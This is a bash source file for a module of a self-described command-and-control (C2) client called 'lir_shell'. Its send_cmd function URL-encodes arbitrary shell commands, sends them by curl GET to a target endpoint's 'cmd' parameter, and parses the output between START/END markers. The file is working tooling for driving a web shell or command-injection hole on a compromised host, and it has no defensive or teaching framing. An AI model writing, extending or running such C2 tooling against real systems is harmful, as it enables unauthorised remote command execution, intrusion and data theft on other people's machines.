#!/usr/bin/env bash
# Lightweight shell module for the modular C2 client.

print_warn() {
  echo -e "${YELLOW}[!]${NC} $1" >&2
}

print_err() {
  echo -e "${RED}[!]${NC} $1" >&2
}
                                                                                        print_std() {
  echo -e "${GREEN}[+]${NC} $1"
}

print_help() {
  echo -e "${BLUE}$1${NC} $2"
}

print_out() {
  echo -e "${GREEN}[+]${YELLOW} $1${NC}"
}

# Initialize the module.
# Expects a URL as the first argument and returns error if not provided.
module_init() {
  # URL is provided as the first positional parameter; default to empty if missing
  URL="${1:-}"
  # If URL is empty, print an error message and return non-zero
  if [[ -z "$URL" ]]; then
    print_err "shell_module_init: URL must be provided"
    return 1
  fi
}

# send_cmd: send a shell command to the remote endpoint and extract its output.
# Parameters:
#   $1 - the shell command to execute remotely
# Behavior:
#   - wraps the command output with explicit markers (START / END)
#   - performs an HTTP GET using curl and URL-encodes the command
#   - strips everything before START and after END to return clean output
send_cmd() {
  local cmd=$(cmd_wrapper "$1")
  # Wrap the command so the remote side prints START and END markers
  local wrapped_cmd="echo START; $cmd; echo END"
  local out
  local tmp
  tmp=$(mktemp) || {
    echo "[!] mktemp failed"
    return 1
  }
  # Use curl to send a GET request with the URL-encoded 'cmd' parameter
  curl -s --get --data-urlencode "cmd=$wrapped_cmd" "$URL" >"$tmp"
  out=$(tr -d '\000' <"$tmp")
  # Remove everything before the START marker
  out="${out#*START}"
  # Remove everything after the END marker
  out="${out%%END*}"
  # Remove leading newlines
  while [[ "${out:0:1}" == $'\n' ]]; do
    out="${out:1}"
  done
  # Remove trailing newlines
  # note: space after : is required for negative index in some bash versions
  while [[ "${out: -1}" == $'\n' ]]; do
    out="${out:0:-1}"
    # if string becomes empty, break to avoid index errors
    [[ -z "$out" ]] && break
  done

  # Print the cleaned output (preserve internal newlines).
  # Using printf ensures predictable behavior with empty strings.
  printf '%s\n' "$out"
}

# module_main: entry point when the module is executed.
# Currently a no-op placeholder so the framework can call it without error.
module_main() {
  :
}

# module_description: short description of the module for listing modules.
module_description() {
  echo "Lightweight command execution module using GET requests. Wraps output between START/END markers for clean parsing.For Log-Image-Redis"
}

# show_module_help: prints usage information for this module.
show_module_help() {
  cat <<EOF
Usage: $0 lir_shell <URL>

Description:
  Sends shell commands via HTTP GET requests.
  Output is wrapped between START/END markers for reliable extraction.

Arguments:
  URL    Target endpoint URL
EOF
}
